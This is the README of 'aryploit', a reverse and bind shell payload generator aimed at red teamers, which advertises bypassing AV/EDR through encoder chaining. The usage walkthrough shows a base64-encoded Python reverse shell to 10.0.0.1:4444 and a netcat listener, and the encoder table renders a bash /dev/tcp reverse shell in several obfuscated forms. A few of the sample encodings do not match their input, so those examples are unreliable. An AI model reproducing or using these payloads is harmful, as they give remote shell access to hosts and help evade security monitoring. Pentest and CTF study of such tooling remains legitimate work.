<div align="center">
  <h1>🔥 ARYPLOIT</h1>
  <p>
    <strong>Metasploit-style reverse/bind shell generator with advanced encoders for red teamers & pentesters</strong>
  </p>

</div>

---

## **🚀 What is ARYPLOIT?**
**aryploit** is a **Metasploit-inspired**, **all-in-one payload generator** for **reverse shells, bind shells, and advanced encoding**. Built for **red teamers, pentesters, and CTF players**, it simplifies payload generation with **10+ encoders**, **cross-platform support (Linux/Windows/Web)**, and **evasion techniques** to bypass AV/EDR.

⚠️ **For authorized testing & educational purposes only.**

---

## **🔥 Features**
✅ **100+ Payloads** – Reverse & bind shells for **Linux, Windows, PHP, ASP, JSP, PowerShell, Python, Ruby, Perl, and more**.
✅ **Advanced Encoders** – Chain **Base64, URL, Hex, ROT13, XOR, Caesar, Binary, Octal, HTML, Unicode** for evasion.
✅ **Search & Filter** – Quickly find payloads with `search payload linux` or `search encoders base64`.
✅ **Listener Examples** – Auto-generate **Netcat, Socat, Python** listener commands.
✅ **Modular & Extensible** – Easy to add **custom payloads, encoders, and listeners**.
✅ **CTF & Red Team Ready** – Designed for **real-world engagements** and **capture-the-flag challenges**.

---

## **📌 Installation**
### **From GitHub (Recommended)**
```bash
git clone https://github.com/giriaryan694-a11y/aryploi.git
cd aryploit


pip3 install -r requirements.txt
python3 aryploit.py

1. List Payloads
 Copyaryploit > list rev_payloads linux
reverse/linux/bash_tcp
reverse/linux/python
reverse/linux/perl
...
Filter by keyword:
 Copyaryploit > search payload tcp
reverse/linux/bash_tcp
reverse/windows/powershell
...
2. Select a Payload
 Copyaryploit > use reverse/linux/bash_tcp
[+] Loaded payload: reverse/linux/bash_tcp
Or use set payload:
 Copyaryploit > set payload reverse/linux/bash_tcp
3. Set LHOST & LPORT
 Copyaryploit > set lhost 10.0.0.1
aryploit > set lport 4444
4. Apply Encoders (Single or Chained)
 Copyaryploit > set encoder base64,url,hex
[+] Encoder chain set: base64, url, hex
5. Generate Payload
 Copyaryploit > generate
[+] Generated Payload:
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7b3MuZHVwMjoocy5maWxlbm8oKSwMCk9TKSwgb3MuZHVwMjoo...
6. Start a Listener
 Copyaryploit > listener nc
[+] Listener Example (nc): nc -lvnp 4444
```
## **🛠️ Encoders (Evasion & Obfuscation)**

| Encoder   | Description                     | Example Output                          |
|-----------|---------------------------------|-----------------------------------------|
| `base64`  | Standard Base64 encoding        | `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=` |
| `url`     | URL encoding                    | `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F...` |
| `hex`     | Hexadecimal encoding            | `62 61 73 68 20 2d 69 20 3e 26 20 2f 64 65 76` |
| `xor`     | XOR encoding (key: `0x55`)      | `¶¬¦¬§¦¬¦§¬¶¦§¬¶¦§¬¶`                |
| `rot13`   | ROT13 cipher                    | `onfu -v >& /qri/gpc/10.0.0.1/4444 0>&1` |
| `reverse` | Reverse the string              | `1>0& 4444/1.0.0.10 cpd/cte/evd/ :ptth` |
| `caesar`  | Caesar cipher (shift +3)        | `edvk -l >& /gfy/wfs/10.0.0.1/4444 0>&1` |
| `binary`  | 8-bit binary                    | `01100010 01100001 01110011 01101000`    |
| `unicode` | Unicode escape                  | `\u0062\u0061\u0073\u0068`              |

## **📜 Payloads Database**

| Platform  | Type    | Payloads                                                                 |
|-----------|---------|--------------------------------------------------------------------------|
| **Windows** | Reverse | `cmd`, `powershell`, `nc`                                               |
| **Web**   | Reverse | `PHP`, `ASP`, `JSP`, `ASPX`                                             |
| **Linux** | Reverse | `bash`, `nc`, `python`, `perl`, `ruby`, `socat`, `openssl`, `telnet`     |
| **Linux** | Bind    | `nc`, `bash`, `socat`, `python`, `perl`                                  |
| **Windows** | Bind   | `nc`, `powershell`                                                      |


Full list: Run list rev_payloads or list bind_payloads.

🔍 Why ARYPLOIT?
🚀 Faster than Metasploit for quick payload generation.
🛡️ Bypasses basic AV/EDR with encoder chaining.
🎓 Perfect for learning reverse shells & evasion.
🔧 Extensible – Add your own payloads & encoders.

📢 Contributing
Contributions are welcome! Open a Pull Request or issue for:

New payloads
Better encoders
Bug fixes
Documentation improvements

Code of Conduct: Be respectful & ethical.

⚠️ Legal Disclaimer
⚠️ ARYPLOIT is for authorized testing only.
⚠️ Unauthorized use is illegal.
⚠️ The author is not responsible for misuse.

📣 Spread the Word
If you find aryploit useful, star ⭐ this repo and share it with your friends!
Follow for updates:

📜 License
This project is licensed under the MIT License – see LICENSE for details.

<div align="center">
  <sub>Built with ❤️ by <a href="https://github.com/giriaryan694-a11y">Aryan Giri</a></sub>
</div>
```
